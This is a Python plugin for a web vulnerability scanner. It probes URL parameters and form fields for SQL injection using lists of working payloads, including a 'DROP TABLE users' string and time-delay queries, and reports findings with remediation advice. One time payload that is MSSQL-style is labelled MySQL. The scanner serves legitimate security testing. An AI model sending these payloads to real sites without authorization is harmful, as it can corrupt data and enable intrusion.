"""
SQL Injection Scanner Module
Tests GET/POST parameters and form fields for SQLi vulnerabilities.
"""

import re
import time
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

from core.base_plugin import BasePlugin, Finding
from utils.logger import get_logger

logger = get_logger("sqli")

# ── Payloads ────────────────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 1=1--",
    "' AND 1=2--",
    "1; DROP TABLE users--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
]

SQLI_BLIND_BOOLEAN_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 OR 1=1", "1 OR 1=2"),
]

SQLI_TIME_PAYLOADS = [
    ("MySQL",  "' AND SLEEP(3)--",            3),
    ("MySQL",  "1; WAITFOR DELAY '0:0:3'--",  3),
    ("MSSQL",  "'; WAITFOR DELAY '0:0:3'--",  3),
    ("Oracle", "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS$SYS$DUMMY',3)--", 3),
    ("PgSQL",  "'; SELECT pg_sleep(3)--",      3),
]

# ── Error fingerprints ───────────────────────────────────────────────────────

DB_ERROR_PATTERNS = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"unclosed quotation mark after the character string",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"supplied argument is not a valid mysql",
    ],
    "MSSQL": [
        r"microsoft OLE DB provider for ODBC drivers",
        r"microsoft SQL server",
        r"OLE DB.*SQL Server",
        r"Unclosed quotation mark",
        r"Incorrect syntax near",
        r"SQLServer JDBC Driver",
    ],
    "Oracle": [
        r"ORA-\d{4,5}",
        r"oracle.*driver",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ],
    "PostgreSQL": [
        r"pg_query\(\): Query failed",
        r"PSQLException",
        r"pg_exec\(\)",
        r"ERROR:\s+syntax error at",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"sqlite3.OperationalError",
        r"SQLite\.Exception",
    ],
    "Generic": [
        r"sql syntax.*mysql",
        r"syntax error.*sql",
        r"invalid query",
        r"sql error",
        r"database error",
    ],
}


class SQLiPlugin(BasePlugin):
    plugin_id = "sqli"
    name = "SQL Injection"
    description = "Detects SQL injection vulnerabilities via error-based, boolean-blind, and time-based techniques"
    owasp_category = "A03:2021"
    mitre_technique = "T1190"

    def run(self, crawl_results: Dict) -> List[Finding]:
        logger.info("Starting SQL Injection scan")

        for url, result in crawl_results.items():
            # Test URL query parameters
            if "?" in url:
                self._test_url_params(url)

            # Test forms
            for form in result.forms:
                self._test_form(form)

        logger.info(f"SQLi scan complete: {len(self.findings)} findings")
        return self.findings

    def _test_url_params(self, url: str):
        """Test each URL parameter for SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return

        for param_name in params:
            # Error-based
            for payload in SQLI_ERROR_PAYLOADS[:8]:  # limit for speed
                injected_url = self._inject_url_param(url, param_name, payload)
                resp = self.session.get(injected_url)
                if resp:
                    db_type, pattern = self._detect_db_error(resp.text)
                    if db_type:
                        self.add_finding(self._make_finding(
                            title=f"SQL Injection (Error-Based) — {db_type}",
                            severity="critical",
                            description=(
                                f"The parameter '{param_name}' is vulnerable to SQL injection. "
                                f"A database error from {db_type} was triggered."
                            ),
                            url=url,
                            parameter=param_name,
                            method="GET",
                            payload=payload,
                            evidence=f"DB Error Pattern matched: {pattern}",
                            response_snippet=resp.text[:500],
                            cwe_id="CWE-89",
                            cvss_score=9.8,
                            confidence="high",
                            remediation=self._remediation(),
                            references=self._references(),
                        ))
                        return  # Don't spam the same param

            # Boolean blind
            self._test_boolean_blind_url(url, param_name)

            # Time-based blind
            self._test_time_based_url(url, param_name)

    def _test_form(self, form):
        """Test each form field for SQL injection."""
        from core.crawler import Form
        for field in form.fields:
            if field.field_type in ("hidden", "submit", "button", "image", "reset", "file"):
                continue

            for payload in SQLI_ERROR_PAYLOADS[:6]:
                data = form.to_data()
                data[field.name] = payload

                if form.method == "POST":
                    resp = self.session.post(form.target_url, data=data)
                else:
                    from urllib.parse import urlencode
                    url = f"{form.target_url}?{urlencode(data)}"
                    resp = self.session.get(url)

                if resp:
                    db_type, pattern = self._detect_db_error(resp.text)
                    if db_type:
                        self.add_finding(self._make_finding(
                            title=f"SQL Injection (Error-Based via Form) — {db_type}",
                            severity="critical",
                            description=(
                                f"Form field '{field.name}' at {form.url} is vulnerable to SQL injection. "
                                f"A database error from {db_type} was triggered."
                            ),
                            url=form.url,
                            parameter=field.name,
                            method=form.method,
                            payload=payload,
                            evidence=f"DB Error matched: {pattern}",
                            cwe_id="CWE-89",
                            cvss_score=9.8,
                            confidence="high",
                            remediation=self._remediation(),
                            references=self._references(),
                        ))
                        break

    def _test_boolean_blind_url(self, url: str, param_name: str):
        """Detect boolean-blind SQLi by comparing true/false responses."""
        baseline = self.session.get(url)
        if not baseline:
            return

        baseline_len = len(baseline.content)

        for true_payload, false_payload in SQLI_BLIND_BOOLEAN_PAIRS:
            true_url = self._inject_url_param(url, param_name, true_payload)
            false_url = self._inject_url_param(url, param_name, false_payload)

            true_resp = self.session.get(true_url)
            false_resp = self.session.get(false_url)

            if not true_resp or not false_resp:
                continue

            true_len = len(true_resp.content)
            false_len = len(false_resp.content)

            # Significant difference between true and false = blind SQLi
            if abs(true_len - false_len) > 50 and true_resp.status_code != false_resp.status_code:
                self.add_finding(self._make_finding(
                    title="SQL Injection (Boolean-Blind)",
                    severity="high",
                    description=(
                        f"Parameter '{param_name}' shows differential responses to boolean payloads, "
                        f"suggesting blind SQL injection vulnerability."
                    ),
                    url=url,
                    parameter=param_name,
                    method="GET",
                    payload=f"True: {true_payload} | False: {false_payload}",
                    evidence=(
                        f"True payload response: {true_len}b (HTTP {true_resp.status_code}), "
                        f"False payload response: {false_len}b (HTTP {false_resp.status_code})"
                    ),
                    cwe_id="CWE-89",
                    cvss_score=8.5,
                    confidence="medium",
                    false_positive_risk="medium",
                    remediation=self._remediation(),
                    references=self._references(),
                ))
                return

    def _test_time_based_url(self, url: str, param_name: str):
        """Detect time-based blind SQLi via response timing."""
        for db_type, payload, expected_delay in SQLI_TIME_PAYLOADS[:2]:
            injected_url = self._inject_url_param(url, param_name, payload)

            start = time.time()
            resp = self.session.get(injected_url)
            elapsed = time.time() - start

            # Must have responded and taken at least 80% of expected delay
            if resp and elapsed >= expected_delay * 0.8:
                self.add_finding(self._make_finding(
                    title=f"SQL Injection (Time-Based Blind) — {db_type}",
                    severity="high",
                    description=(
                        f"Parameter '{param_name}' caused a {elapsed:.1f}s delay when injected "
                        f"with a time-based payload targeting {db_type}."
                    ),
                    url=url,
                    parameter=param_name,
                    method="GET",
                    payload=payload,
                    evidence=f"Response delay: {elapsed:.2f}s (expected: {expected_delay}s)",
                    cwe_id="CWE-89",
                    cvss_score=8.0,
                    confidence="medium",
                    false_positive_risk="medium",
                    remediation=self._remediation(),
                    references=self._references(),
                ))
                return

    def _detect_db_error(self, html: str) -> tuple:
        """Return (db_type, matched_pattern) or (None, None) if no DB error found."""
        html_lower = html.lower()
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, html_lower, re.IGNORECASE):
                    return db_type, pattern
        return None, None

    def _inject_url_param(self, url: str, param_name: str, payload: str) -> str:
        """Replace a specific parameter value with the payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _remediation(self) -> str:
        return (
            "Use parameterized queries (prepared statements) instead of string concatenation. "
            "Apply input validation and whitelist allowable characters. "
            "Use an ORM with built-in escaping. "
            "Apply the principle of least privilege to database accounts. "
            "Implement a WAF as a defense-in-depth measure."
        )

    def _references(self) -> List[str]:
        return [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://portswigger.net/web-security/sql-injection",
        ]
